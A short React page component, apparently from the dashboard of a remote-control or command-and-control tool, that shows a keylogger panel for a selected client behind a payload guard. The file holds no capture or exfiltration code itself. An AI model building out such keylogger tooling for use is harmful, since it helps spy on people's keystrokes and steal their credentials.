import { useParams } from "react-router-dom";
import { TopBar } from "@/components/layout/TopBar";
import { KeyloggerPanel } from "@/components/client/KeyloggerPanel";
import { PayloadPageGuard } from "@/components/client/PayloadPageGuard";

export default function Keylogger() {
  const { id } = useParams<{ id: string }>();

  if (!id) return null;

  return (
    <div className="h-screen flex flex-col">
      <TopBar clientId={id} />
      <PayloadPageGuard clientId={id} payloadKey="keylogger">
        <div className="max-w-5xl mx-auto w-full py-4 px-4">
          <KeyloggerPanel clientId={id} />
        </div>
      </PayloadPageGuard>
    </div>
  );
}
